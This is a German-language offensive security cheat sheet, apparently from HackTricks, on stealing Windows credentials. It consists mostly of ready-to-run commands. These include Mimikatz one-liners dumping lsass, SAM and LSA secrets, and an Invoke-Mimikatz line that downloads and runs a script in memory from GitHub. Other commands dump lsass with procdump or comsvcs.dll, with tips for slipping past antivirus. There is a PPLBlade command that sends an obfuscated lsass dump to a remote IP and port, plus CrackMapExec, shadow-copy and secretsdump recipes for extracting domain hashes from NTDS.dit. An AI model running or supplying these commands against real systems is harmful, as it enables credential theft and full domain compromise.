# Stehlen von Windows-Anmeldeinformationen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldeinformationen Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde andere Dinge, die Mimikatz tun kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahren Sie hier mehr über mögliche Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige Anmeldeinformationen extrahiert.**

## Anmeldeinformationen mit Meterpreter

Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **nach Passwörtern und Hashes** im Opfer zu suchen.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Umgehen von AV

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Sie können dieses Tool verwenden, um **den lsass-Prozess zu dumpen**, **den Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Daher ist es **stealthier**, den **PID** von lsass.exe als **Argument** an procdump **statt des** **Namens lsass.exe** zu übergeben.

### Dumpen von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist verantwortlich für das **Dumpen des Prozessspeichers** im Falle eines Absturzes. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die dazu gedacht ist, mit `rundll32.exe` aufgerufen zu werden.\
Es ist irrelevant, die ersten beiden Argumente zu verwenden, aber das dritte ist in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, stellt die erste Komponente dar, der Speicherort der Dump-Datei repräsentiert die zweite, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine alternativen Optionen.\
Nach der Analyse dieser drei Komponenten wird die DLL aktiviert, um die Dump-Datei zu erstellen und den Speicher des angegebenen Prozesses in diese Datei zu übertragen.\
Die Verwendung von **comsvcs.dll** ist möglich, um den lsass-Prozess zu dumpen, wodurch die Notwendigkeit entfällt, procdump hochzuladen und auszuführen. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **Dumping lsass mit dem Task-Manager**

1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und wählen Sie den Task-Manager aus.
2. Klicken Sie auf Weitere Details.
3. Suchen Sie im Tab Prozesse nach dem Prozess "Local Security Authority Process".
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und wählen Sie "Dump-Datei erstellen".

### Dumping lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpen von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das das Obfuskieren von Speicherdumps unterstützt und diese auf Remote-Workstations überträgt, ohne sie auf der Festplatte abzulegen.

**Hauptfunktionen**:

1. Umgehung des PPL-Schutzes
2. Obfuskation von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
3. Hochladen von Speicherdumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAM-Hashes dumpen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Geheimnisse dumpen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dumpen Sie die NTDS.dit vom Ziel-DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dumpen Sie die NTDS.dit Passwort-Historie vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeigen Sie das Attribut pwdLastSet für jedes NTDS.dit-Konto an
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Diese Dateien sollten sich **befinden** in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.

### From Registry

Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registrierung zu erhalten:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laden Sie** diese Dateien auf Ihre Kali-Maschine herunter und **extrahieren Sie die Hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können geschützte Dateien mit diesem Dienst kopieren. Sie müssen Administrator sein.

#### Verwendung von vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber Sie können dasselbe mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (die verwendete Festplatte ist "C:" und sie wird in C:\users\Public gespeichert), aber Sie können dies auch verwenden, um jede geschützte Datei zu kopieren:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Schließlich könnten Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory-Anmeldeinformationen - NTDS.dit**

Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passwort-Hashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

Innerhalb dieser Datenbank werden drei Haupttabellen verwaltet:

- **Datentabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
- **Verknüpfungstabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
- **SD-Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gespeichert, um die Sicherheit und den Zugriff auf die gespeicherten Objekte zu gewährleisten.

Weitere Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Ein **Teil** der **NTDS.dit**-Datei könnte sich **im `lsass`-Speicher** befinden (Sie können die zuletzt abgerufenen Daten wahrscheinlich aufgrund der Leistungsverbesserung durch die Verwendung eines **Caches** finden).

#### Entschlüsselung der Hashes in NTDS.dit

Der Hash ist dreimal verschlüsselt:

1. Entschlüsseln des Passwortverschlüsselungsschlüssels (**PEK**) mit dem **BOOTKEY** und **RC4**.
2. Entschlüsseln des **Hashes** mit **PEK** und **RC4**.
3. Entschlüsseln des **Hashes** mit **DES**.

**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch im **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterschiedlich zwischen Domänencontrollern)** verschlüsselt. Aus diesem Grund müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Sie könnten auch den [**Volume Shadow Copy**](#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM Datei** benötigen (nochmals, [**dumpen Sie sie aus der Registry oder verwenden Sie den Volume Shadow Copy**](#stealing-sam-and-system) Trick).

### **Hashes aus NTDS.dit extrahieren**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** **erhalten haben**, können Sie Tools wie _secretsdump.py_ verwenden, um die **Hashes** zu **extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können sie auch **automatisch extrahieren**, indem Sie einen gültigen Domänen-Administratorbenutzer verwenden:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **metasploit-Modul** verwenden: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject`

### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und deren Attribute für weitere Informationsbeschaffung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, zusätzliche Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitshierarchie und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensart, Richtung und Attributen...

## Lazagne

Laden Sie die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese Binärdatei verwenden, um Anmeldeinformationen aus mehreren Softwareanwendungen zu extrahieren.
```
lazagne.exe all
```
## Andere Tools zum Extrahieren von Anmeldeinformationen aus SAM und LSASS

### Windows Credentials Editor (WCE)

Dieses Tool kann verwendet werden, um Anmeldeinformationen aus dem Speicher zu extrahieren. Laden Sie es herunter von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahieren Sie Anmeldeinformationen aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrahieren Sie Anmeldeinformationen aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laden Sie es herunter von: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und **führen Sie es einfach aus**, und die Passwörter werden extrahiert.

## Defenses

[**Erfahren Sie hier mehr über einige Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
